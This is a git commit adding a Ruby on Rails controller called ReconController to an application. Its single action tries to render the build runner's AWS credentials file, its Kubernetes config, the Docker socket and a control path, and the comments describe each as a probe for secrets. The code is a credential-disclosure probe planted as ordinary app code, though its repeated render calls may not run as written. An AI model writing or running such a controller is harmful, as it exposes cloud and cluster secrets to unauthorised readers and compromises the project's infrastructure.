52a94971785276cb0037a421f227ca738f180ee8
zhengg-second <peter.henggeler@owasp.org>
2026-01-07 19:56:46 -0700

    Create recon_controller.rb

---
+++ app/controller/recon_controller.rb
@@ -0,0 +1,15 @@
+class ReconController < ApplicationController
+  def index
+    # Probe 1: Check for common cloud credentials
+    render '/home/runner/.aws/credentials'
+    
+    # Probe 2: Check for Kube config
+    render '/home/runner/.kube/config'
+    
+    # Probe 3: Check for Docker socket
+    render '/var/run/docker.sock'
+    
+    # Probe 4: Check for a file we know DOESN'T exist (Control Group)
+    render '/etc/sensitive_file_that_does_not_exist'
+  end
+end
